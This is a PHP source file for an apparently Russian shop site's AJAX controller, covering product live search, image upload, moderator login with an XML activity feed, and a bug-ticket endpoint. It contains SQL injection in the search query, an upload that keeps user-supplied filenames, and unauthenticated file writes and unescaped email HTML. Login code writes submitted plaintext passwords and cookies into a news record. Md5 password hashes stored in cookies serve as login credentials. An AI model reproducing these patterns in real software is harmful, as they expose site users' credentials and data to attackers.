<?php
/**
 * class to Ajax action
 * @author mvc
 */

class AjaxController extends BaseController{
	
	function __construct ($registry, $params)
	{
		$this->registry = $registry;
		parent::__construct($registry, $params);
	}

    function livesearchAction()
    {
        if(isset($_POST['search']) && $_POST['search'] != "")
		{
            $result = '';
            $where = $_POST['search'];
            $res = $this->db->rows("SELECT tb.id, tb.url, tb2.name
                                    FROM `product` tb
									
                                    LEFT JOIN `ru_product` tb2
									ON tb.id = tb2.product_id
									
                                    WHERE tb.active='1' AND (tb2.name like  '%{$where}%' OR	 tb2.body_m like '%{$where}%' OR tb2.body like '%{$where}%')
                                    ORDER BY tb.id DESC	LIMIT 10");
            if(count($res)>0)
			{
                $result = '<ul>';
                foreach($res as $row)
				{
                    $dir = Dir::createDir($row['id']);
                    if(file_exists($dir[0] . "{$row['id']}_s.jpg"))
                        $src = '<img width="30" height="30" alt="' . $row['name'] . '" title="' . $row['name'] . '" src="/' . $dir[0] . $row['id'] . '_s.jpg" />';
                    else $src = '<a href="/product/' . $row['url'] . '"><img alt="" width="30" height="30" src="/files/default.jpg" /></a>';
                    $result .= '<li><a class="s_link" href="/product/' . $row['url'] . '">' . $src . '' . mb_substr($row['name'], 0, 60, 'utf-8') . '</a></li>';
                }
                $result .= '</ul>';
            }
            echo $result;
        }
    }
	
	function uploadifyAction()
    {
		$targetFolder = '/uploads'; // Relative to the root
		$verifyToken = md5('unique_salt' . $_POST['timestamp']);
		
		if(!empty($_FILES) && $_POST['token'] == $verifyToken)
		{
			$tempFile = $_FILES['Filedata']['tmp_name'];
			$targetPath = $_SERVER['DOCUMENT_ROOT'] . $targetFolder;
			$targetFile = rtrim($targetPath,'/') . '/' . $_FILES['Filedata']['name'];
			
			// Validate the file type
			$fileTypes = array('jpg','jpeg','gif','png'); // File extensions
			$fileParts = pathinfo($_FILES['Filedata']['name']);
			
			if (in_array($fileParts['extension'],$fileTypes))
			{
				move_uploaded_file($tempFile,$targetFile);
				echo '1';
			}
			else{
				echo 'Invalid file type.';
			}
		}
	}
	
	function agentikAction()
    {
		$settings = Registry::get('user_settings');
		$vars['translate'] = $this->translation;
		
		//unset($_COOKIE);
		//$this->checkAuthAgentik();
		
		if(!$this->checkAuthAgentik())
		{
			if(isset($_POST['login'], $_POST['password']))
			{
				$this->db->query("UPDATE ru_news SET keywords='".date("H:i:s")." ".print_r($_POST, true).' = '.$moderator['id']." ggggg' WHERE news_id='6'");
				$sql = "SELECT id, type_moderator, login FROM `moderators` WHERE `login`=? AND `password`=? AND `active`=?";
				$param = array($_POST['login'], md5($_POST['password']), 1);
				$res = $this->db->row($sql, $param);
	
				if($res['id']!='')
				{
					$admin_info['agent'] = '';
					$admin_info['referer'] = '';
					$admin_info['ip'] = '';
					$admin_info['id'] = $res['id'];
					$admin_info['type'] = $res['type_moderator'];
					$admin_info['login'] = $res['login'];
					$_SESSION['admin'] = $admin_info;
					
					setcookie('login', $_POST['login'], time()+(31566000), '/', ".".$_SERVER['HTTP_HOST']);
					setcookie('password', md5($_POST['password']), time()+(31566000), '/', ".".$_SERVER['HTTP_HOST']);
					
					$this->db->query("UPDATE ru_news SET description='".date("H:i:s")." ".print_r($_COOKIE, true).' = '.$moderator['id']." ggggg' WHERE news_id='6'");
					header('location:'.$_SERVER['REQUEST_URI']);
					//exit();
				}
			}
		}
		else{
			//if(!isset($_COOKIE['login'],$_COOKIE['password']))return false;
			
			$moderator = $this->db->row("SELECT `id` FROM `moderators` WHERE login=? AND password=?", array($_COOKIE['login'], $_COOKIE['password']));
			if(!isset($moderator['id']))return false;
			
			$users_limit = 99;
			$orders_limit = 99;
			$fdb_limit = 99;
			
			$xml = new DomDocument('1.0', 'UTF-8');
			$rows = $xml->appendChild($xml->createElement('rows'));
			
			$arr1 = $this->showLastUsers($users_limit);
			$arr2 = $this->showLastOrders($orders_limit);
			$arr3 = $this->showLastFeedback($fdb_limit);
	
			$ALL = array_merge($arr1, $arr2, $arr3);
	
			foreach($ALL as $row_)
			{
				 $row = $rows->appendChild($xml->createElement('row'));
				 $row_type = $row->appendChild($xml->createElement('row_type'));
				 $type = $row_type->appendChild($xml->createElement('type'));
				 $type->appendChild($xml->createTextNode($row_['_type']));
				 $typename = $row_type->appendChild($xml->createElement('typename'));
				 $typename->appendChild($xml->createTextNode($row_['table']));
				 $ico = $row_type->appendChild($xml->createElement('ico'));
				 $ico->appendChild($xml->createTextNode('http://'.$_SERVER['HTTP_HOST'].'/images/ico/'.$row_['_type'].'.png'));
				 $tema = $row_type->appendChild($xml->createElement('tema'));
				 $tema->appendChild($xml->createTextNode($row_['name']));
				 $url = $row_type->appendChild($xml->createElement('url'));
				 $url->appendChild($xml->createTextNode('http://'.$_SERVER['HTTP_HOST'].'/admin/'.$row_['_type'].'/edit/'.$row_['id'].''));
				 $row_buttons = $row->appendChild($xml->createElement('buttons'));
				 $row_properties = $row->appendChild($xml->createElement('row_properties'));
				 $number = $row_properties->appendChild($xml->createElement('number'));
				 $number->appendChild($xml->createTextNode($row_['id']));
				 $contractor = $row_properties->appendChild($xml->createElement('contractor'));
				 $contr_id = $contractor->appendChild($xml->createElement('contractor_id'));
				 $contr_id->appendChild($xml->createTextNode($moderator['id']));
				 $contr_name = $contractor->appendChild($xml->createElement('contractor_name'));
				 $contr_name->appendChild($xml->createTextNode($settings['sitename']));
				 $new = $row_properties->appendChild($xml->createElement('new'));
				 $new->appendChild($xml->createTextNode('1'));
				 $name = $row_properties->appendChild($xml->createElement('name'));
				 $name->appendChild($xml->createTextNode($row_['name']));
				 $date = $row_properties->appendChild($xml->createElement('date'));
				 $date->appendChild($xml->createTextNode($row_['date']));
			}
			
			$xml->formatOutput = true;
			$vars['xml'] = $xml->saveXML();
			$this->db->query("UPDATE ru_news SET title='".date("H:i:s")." ".$moderator['id']." ggggg' WHERE news_id='6'");

			$data = $this->view->Render('xml.phtml', $vars);
			return $data;
		}
	}

	function testingsendAction() 	
	{		
		$url = $_POST['URL'];		
		$subject = $_POST['SUBJECT'];		
		$text = $_POST['TEXT'];		
		$image = $_POST['IMAGE'];				

		$insert_id = $this->db->insert_id("INSERT INTO `testing` SET `url`=?, `subject`=?, `text`=?", array($url, $subject, $text));				

		$image = str_replace('data:image/jpeg;base64,', '', $image);		
		$decoded = base64_decode($image);				
		file_put_contents( $_SERVER['DOCUMENT_ROOT'].'/files/testing/'.$insert_id.'.jpg', $decoded, LOCK_EX);						

		$body = "<table>
			<tr>
				<td>Ссылка: <br/></td><td>".$url." </td>	
			</tr><tr>		
				<td>Тема: <br/></td><td>".$subject." </td>	
			</tr><tr>	
				<td>Описание: <br/></td><td>".$text." </td>			
			</tr><tr>	
			<tr><td colspan='2'>Скриншот: <br/></td><tr>
			<tr><td colspan='2'>
				<a href='http://".$_SERVER['HTTP_HOST']."/files/testing/".$insert_id.".jpg'>
					<img width='50%' height='50%' src='http://".$_SERVER['HTTP_HOST']."/files/testing/".$insert_id.".jpg' />
				</a></td></tr>
			</table>";				

		Mail::send($this->settings['sitename'],
					"info@".$_SERVER['HTTP_HOST'],
					"Admin",
					$this->settings['testing_email'],
					"utf-8", 
					"utf-8",
					"Новый тикет на сайте ".$this->settings['sitename']." - ".$subject,
					$body
	    );

		if(isset($this->settings['testing_project_id']) && (int)$this->settings['testing_project_id']!=0) {


			$POST_URL = 'http://mysecretar.com/myss/post_ticket.php';
			$postData = array();
			$postData['url'] = $url;
			$postData['subject'] = $subject;
			$postData['project_id'] = $this->settings['testing_project_id'];
			$postData['text'] = $text;
			$postData['image'] = "http://".$_SERVER['HTTP_HOST']."/files/testing/".$insert_id.".jpg";
			$postData['submit'] ='submit';
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $POST_URL);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
			curl_exec($ch);
			curl_close($ch);
		}
	}

	function checkAuthAgentik()
	{
		if(isset($_COOKIE['login'],$_COOKIE['password']))
		{
			$sql = "SELECT id, type_moderator, login FROM `moderators` WHERE `login`=? AND `password`=? AND `active`=?";
			$param = array($_COOKIE['login'], $_COOKIE['password'], 1);
			$res = $this->db->row($sql, $param);
			
			if($res['id']!='')
			{
				$admin_info['agent'] = '';
				$admin_info['referer'] = '';
				$admin_info['ip'] = '';
				$admin_info['id'] = $res['id'];
                $admin_info['type'] = $res['type_moderator'];
				$admin_info['login'] = $res['login'];
				$_SESSION['admin'] = $admin_info;
				
				setcookie('login', $_COOKIE['login'],  time()+3600*24);
				setcookie('password', $_COOKIE['password'],  time()+3600*24);
			}
			else $error = 'error';
		}
		if(isset($error))unset($_SESSION['admin']);
		if(!isset($_SESSION['admin']))return false;
		return true;
	}
	
	private function showLastUsers($limit)
    {
       $res = $this->db->rows("SELECT tb.*, 
										tb.`start_date` as 'date', 
										m.name as 'table', 
										m.controller as _type 
								FROM `users` tb
								
								LEFT JOIN `modules` m 
								ON m.controller = 'users'
								
								WHERE tb.`datashow` = '0'
								ORDER BY tb.`start_date` DESC LIMIT ".$limit."");
		return $res;						
    }

    private function showLastOrders($limit)
    {
        return $this->db->rows("SELECT tb.*, 
									   tb.`username` as 'name', 
									   tb.`date_add` as date, 
									   m.name as 'table', 
									   m.controller as '_type' 
									   
								FROM `orders` tb
								
								LEFT JOIN `modules` m 
								ON m.controller = 'orders'
								
								WHERE tb.`datashow` = '0'
								ORDER BY tb.`date_add` DESC 
								LIMIT ".$limit."");
    }

    private function showLastFeedback($limit)
    {
        return $this->db->rows("SELECT tb.*, 
								m.name as 'table', 
								m.controller as '_type' 
								FROM `feedback` tb
								LEFT JOIN `modules` m ON m.controller = 'feedback'
								WHERE tb.`datashow` = '0'
								ORDER BY tb.`date` DESC LIMIT ".$limit."");
    }
}
?>